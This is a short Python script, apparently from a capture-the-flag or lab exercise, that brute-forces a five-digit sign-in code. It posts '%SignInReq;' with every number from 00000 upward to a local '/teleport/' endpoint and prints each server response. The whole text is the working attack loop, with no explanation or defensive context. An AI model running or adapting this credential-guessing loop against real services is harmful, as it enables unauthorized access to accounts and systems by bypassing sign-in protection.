import requests

url = "http://localhost:8080/teleport/"

headers = {
    "Content-Type": "text/plain"
}

for i in range(99999):
    data=f"%SignInReq;{f'{i:05}'}"
    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
        print(data + "-->" + response.text)
    else:
        print("Request failed with status code:", response.status_code)
